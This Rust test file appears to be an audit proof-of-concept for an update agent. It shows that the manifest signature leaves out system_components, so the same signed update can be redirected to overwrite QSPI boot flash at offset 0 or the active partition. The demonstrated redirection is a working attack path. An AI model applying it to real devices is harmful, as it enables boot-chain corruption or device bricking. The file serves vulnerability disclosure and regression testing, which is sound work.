//! Proof-of-concept: the manifest signature does not cover `system_components`
//! or `sources`, so a signed update can be redirected to any destination.
//!
//! The test asserts the *current* (vulnerable) behaviour so it passes today and
//! fails once the signature is extended (or a fixed on-device destination table
//! is enforced). See `SECURITY_AUDIT_FINDINGS.md` at the repository root.

use std::collections::HashMap;

use base64::Engine as _;
use orb_update_agent_core::{
    manifest::{InstallationPhase, ManifestBuilder, UpdateKind},
    reexports::ed25519_dalek::{Signer, SigningKey},
    Claim, Component as SystemComponent, LocalOrRemote, ManifestComponent, MimeType,
    Source,
};
use sha2::{Digest, Sha256};

fn sha256_hex(bytes: &[u8]) -> String {
    Sha256::digest(bytes)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// F2: `manifest-sig` is computed over the raw `manifest` JSON only. The same
/// signature validates a claim that writes `rootfs` to the redundant APP
/// partition and a claim that writes the very same signed bytes over QSPI
/// offset 0 (the boot chain) or over the *active* slot's partition.
#[test]
fn poc_f2_system_components_not_covered_by_signature() {
    let signing_key = SigningKey::from_bytes(&[7u8; 32]);
    let pubkey = signing_key.verifying_key();

    let manifest = ManifestBuilder::new()
        .magic("some magic")
        .kind(UpdateKind::Normal)
        .components(vec![ManifestComponent {
            name: "rootfs".into(),
            version_assert: "1.0.0".into(),
            version_upgrade: "1.0.1".into(),
            size: 4,
            hash: sha256_hex(b"blob"),
            installation_phase: InstallationPhase::Normal,
        }])
        .build()
        .unwrap();
    let manifest_raw = serde_json::to_string(&manifest).unwrap();
    let signature = base64::engine::general_purpose::STANDARD
        .encode(signing_key.sign(manifest_raw.as_bytes()).to_bytes());

    let source = Source {
        hash: sha256_hex(b"blob"),
        mime_type: MimeType::OctetStream,
        name: "rootfs".into(),
        size: 4,
        url: LocalOrRemote::parse("https://example.invalid/rootfs").unwrap(),
    };

    let build = |system_component: serde_json::Value| {
        let system_components: HashMap<String, SystemComponent> =
            serde_json::from_value(serde_json::json!({"rootfs": system_component}))
                .unwrap();
        Claim::builder()
            .manifest(manifest.clone())
            .manifest_raw(manifest_raw.clone())
            .signature(signature.clone())
            .sources(HashMap::from([("rootfs".to_string(), source.clone())]))
            .system_components(system_components)
            .version("6.0.0")
            .build(&pubkey)
    };

    // What the vendor intended.
    build(serde_json::json!({
        "type": "gpt",
        "value": {"device": "ssd", "label": "APP", "redundancy": "redundant"}
    }))
    .expect("legitimate claim verifies");

    // Attacker on the claim channel, no signing key: write the blob at offset 0
    // of the QSPI boot flash, slot-agnostic.
    build(serde_json::json!({
        "type": "raw",
        "value": {"device": "qspi", "offset": 0, "size": 0, "redundancy": "single"}
    }))
    .expect("VULNERABLE: redirected destination verifies with the same signature");

    // ...or over the active slot's partition (`single` adds no slot suffix).
    build(serde_json::json!({
        "type": "gpt",
        "value": {"device": "ssd", "label": "APP_A", "redundancy": "single"}
    }))
    .expect("VULNERABLE: active-slot overwrite verifies with the same signature");

    // Control: tampering with the *signed* part is caught.
    let mut tampered = manifest_raw.clone();
    tampered.insert_str(1, r#""x":1,"#);
    let err = Claim::builder()
        .manifest(manifest.clone())
        .manifest_raw(tampered)
        .signature(signature.clone())
        .sources(HashMap::from([("rootfs".to_string(), source.clone())]))
        .system_components(
            serde_json::from_value(serde_json::json!({
                "rootfs": {"type": "capsule", "value": {}}
            }))
            .unwrap(),
        )
        .version("6.0.0")
        .build(&pubkey);
    assert!(err.is_err(), "manifest tampering must be rejected");
}
